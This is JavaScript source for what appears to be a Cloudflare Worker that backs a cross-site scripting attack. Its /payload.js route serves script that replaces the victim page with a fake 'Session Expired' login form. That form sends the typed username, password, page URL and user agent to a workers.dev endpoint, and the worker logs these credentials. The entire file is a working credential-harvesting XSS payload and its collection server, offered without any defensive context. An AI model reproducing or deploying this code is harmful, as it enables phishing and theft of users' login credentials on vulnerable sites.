export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // Handle CORS preflight requests
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    // Serve JavaScript payload
    if (url.pathname === "/payload.js") {
      const jsPayload = `
        // Clear all existing content
        document.head.innerHTML = '<title>Login Required</title>';
        document.body.innerHTML = '';
        
        // Create fake login page
        const loginHTML = \`
        <div style="
          font-family: Arial, sans-serif;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          margin: 0;
          padding: 20px;
        ">
          <div style="
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
          ">
            <div style="text-align: center; margin-bottom: 30px;">
              <h2 style="color: #333; margin: 0 0 10px 0;">Session Expired</h2>
              <p style="color: #666; margin: 0;">Please login to continue</p>
            </div>
            
            <form id="loginForm" style="margin: 0;">
              <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 5px; color: #333; font-weight: bold;">
                  Username or Email
                </label>
                <input 
                  type="text" 
                  id="username" 
                  required
                  style="
                    width: 100%;
                    padding: 12px;
                    border: 2px solid #ddd;
                    border-radius: 5px;
                    font-size: 16px;
                    box-sizing: border-box;
                  "
                >
              </div>
              
              <div style="margin-bottom: 30px;">
                <label style="display: block; margin-bottom: 5px; color: #333; font-weight: bold;">
                  Password
                </label>
                <input 
                  type="password" 
                  id="password" 
                  required
                  style="
                    width: 100%;
                    padding: 12px;
                    border: 2px solid #ddd;
                    border-radius: 5px;
                    font-size: 16px;
                    box-sizing: border-box;
                  "
                >
              </div>
              
              <button 
                type="submit"
                style="
                  width: 100%;
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  color: white;
                  padding: 14px;
                  border: none;
                  border-radius: 5px;
                  font-size: 16px;
                  cursor: pointer;
                  font-weight: bold;
                "
              >
                Sign In
              </button>
            </form>
            
            <div style="text-align: center; margin-top: 20px;">
              <a href="#" style="color: #667eea; text-decoration: none; font-size: 14px;">
                Forgot your password?
              </a>
            </div>
          </div>
        </div>
        \`;
        
        // Insert the fake login page
        document.body.innerHTML = loginHTML;
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        
        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const username = document.getElementById('username').value;
          const password = document.getElementById('password').value;
          
          // Send credentials to your worker
          fetch('https://worker.mobzillafaceyt.workers.dev/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              username: username,
              password: password,
              url: window.location.href,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent
            })
          });
          
          // Show fake loading/error message
          const button = e.target.querySelector('button');
          button.textContent = 'Signing in...';
          button.disabled = true;
          
          setTimeout(() => {
            alert('Login failed. Please try again.');
            button.textContent = 'Sign In';
            button.disabled = false;
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
          }, 2000);
        });
      `;

      return new Response(jsPayload, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "application/javascript",
          "Cache-Control": "no-cache",
        },
      });
    }

    // Handle credentials endpoint
    if (url.pathname === "/credentials" && request.method === "POST") {
      const data = await request.json();
      console.log("Captured credentials:", {
        username: data.username,
        password: "[REDACTED]",
        url: data.url,
        timestamp: data.timestamp,
        userAgent: data.userAgent
      });
      
      return new Response("Login processed", {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "text/plain",
        },
      });
    }

    // Default response
    console.log("XSS payload triggered:", new Date().toISOString());
    return new Response("XSS request received successfully", {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Content-Type": "text/plain",
      },
    });
  },
};
